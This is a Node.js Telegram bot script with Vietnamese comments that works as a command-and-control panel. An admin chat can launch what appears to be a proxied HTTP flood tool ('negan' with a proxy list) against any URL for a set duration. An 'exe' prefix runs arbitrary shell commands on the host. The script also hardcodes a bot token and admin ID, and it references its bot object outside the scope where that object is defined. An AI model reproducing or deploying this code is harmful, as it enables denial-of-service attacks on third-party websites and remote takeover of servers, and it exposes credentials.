const TelegramBot = require('node-telegram-bot-api'), { exec } = require('child_process'), os = require('os');
const token = '7534473375:AAFJ3nC3nU8t6uNh4FAU5I3yA2-0Xy0CGLA', adminId = 7371969470;

// Hàm lấy thông số CPU và RAM
const getSystemStats = () => {
    const totalMemory = os.totalmem(), freeMemory = os.freemem(), usedMemory = totalMemory - freeMemory;
    const memoryUsagePercent = ((usedMemory / totalMemory) * 100).toFixed(2);
    const cpuUsagePercent = (os.cpus().reduce((acc, cpu) => {
        const total = Object.values(cpu.times).reduce((a, b) => a + b, 0), idle = cpu.times.idle;
        return acc + (100 - (idle / total) * 100);
    }, 0) / os.cpus().length).toFixed(2);
    return { memoryUsagePercent, cpuUsagePercent, totalMemory: (totalMemory / 1024 / 1024 / 1024).toFixed(0), freeMemory: (freeMemory / 1024 / 1024 / 1024).toFixed(0) };
};

// Gửi thông số CPU và RAM mỗi 14 giây
setInterval(() => {
    const stats = getSystemStats(), cpuFreePercent = (100 - parseFloat(stats.cpuUsagePercent)).toFixed(2);
    bot.sendMessage(adminId, `Thông số đã sử dụng: 🚀\n- CPU đã sử dụng: ${stats.cpuUsagePercent}%\n- RAM đã sử dụng: ${stats.memoryUsagePercent}%\n\nThông số còn trống: ❤️\n- CPU còn trống: ${cpuFreePercent}%\n- RAM còn trống: ${stats.freeMemory}GB\n- Tổng RAM: ${stats.totalMemory}GB`);
}, 14000);

// Hàm chia nhỏ tin nhắn và xử lý lỗi Markdown
const sendLongMessage = async (chatId, text) => {
    const maxLength = 4096;
    const escapeMarkdown = (str) => str.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&'); // Escape ký tự Markdown
    for (let i = 0; i < text.length; i += maxLength) {
        const chunk = escapeMarkdown(text.substring(i, i + maxLength));
        try {
            await bot.sendMessage(chatId, chunk, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error(`[ERROR] Gửi tin nhắn thất bại: ${error.message}`);
            await bot.sendMessage(chatId, `🚫 Lỗi khi gửi kết quả: ${error.message}`);
        }
    }
};

// Biến để kiểm tra bot đã khởi động xong chưa
let isBotReady = false;

// Khởi tạo bot và xử lý lỗi
const initBot = () => {
    const bot = new TelegramBot(token, { polling: true });
    bot.on('polling_error', (error) => {
        console.error(`[POLLING ERROR] ${error.code}: ${error.message}`);
        setTimeout(initBot, 5000); // Khởi động lại bot sau 5 giây
    });

    // Xử lý lệnh từ admin
    bot.on('message', async (msg) => {
        const chatId = msg.chat.id, text = msg.text;
        if (chatId !== adminId) return bot.sendMessage(chatId, 'Bạn không có quyền thực hiện lệnh này.');

        // Chỉ xử lý lệnh nếu bot đã khởi động xong
        if (!isBotReady) return;

        // Xử lý lệnh dạng "https://muahack.com 10"
        if (text.startsWith('http') || text.startsWith('htttp') || text.startsWith('htttps')) {
            const correctedText = text.replace(/^ht+tps?:\/\//, 'https://'), parts = correctedText.split(' ');
            if (parts.length !== 2 || isNaN(parts[1])) return bot.sendMessage(chatId, 'Sai định dạng! Nhập theo: <URL> <time>.');
            const [host, time] = parts, command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
            console.log(`[DEBUG] Lệnh được thực thi: ${command}`);
            await bot.sendMessage(chatId, `🚀 Đang thực thi lệnh: \`${command}\``);
            const child = exec(command);
            let output = '';
            child.stdout.on('data', (data) => { output += data.toString(); console.log(`[DEBUG] stdout: ${data.toString()}`); });
            child.stderr.on('data', (data) => { output += data.toString(); console.log(`[DEBUG] stderr: ${data.toString()}`); });
            child.on('close', () => { console.log(`[DEBUG] Lệnh đã kết thúc với kết quả: ${output}`); sendLongMessage(chatId, `🚀 Kết quả lệnh: \`${command}\`\n\`\`\`\n${output}\n\`\`\``); });
            return;
        }

        // Xử lý lệnh bắt đầu bằng "exe"
        if (text.startsWith('exe ')) {
            const command = text.slice(4).trim();
            if (!command) return bot.sendMessage(chatId, 'Lệnh không được để trống. Ví dụ: "exe ls"');
            console.log(`[DEBUG] Lệnh được thực thi: ${command}`);
            await bot.sendMessage(chatId, `🚀 Đang thực thi lệnh: \`${command}\``);
            const child = exec(command === 'pkill .' ? 'pkill -f -9 start.sh prxscan.py negan.js bot.js' : command);
            let output = '';
            child.stdout.on('data', (data) => { output += data.toString(); console.log(`[DEBUG] stdout: ${data.toString()}`); });
            child.stderr.on('data', (data) => { output += data.toString(); console.log(`[DEBUG] stderr: ${data.toString()}`); });
            child.on('close', () => { console.log(`[DEBUG] Lệnh đã kết thúc với kết quả: ${output}`); sendLongMessage(chatId, `🚀 Kết quả lệnh: \`${command}\`\n\`\`\`\n${output}\n\`\`\``); });
            return;
        }

        // Nếu lệnh không hợp lệ
        bot.sendMessage(chatId, 'Lệnh không hợp lệ. Vui lòng bắt đầu lệnh với "exe" hoặc nhập URL và thời gian.');
    });

    // Đánh dấu bot đã khởi động xong
    bot.on('polling_start', () => {
        isBotReady = true;
        console.log('[DEBUG] Bot đã khởi động xong và sẵn sàng nhận lệnh.');
    });
};

// Khởi động bot
initBot();
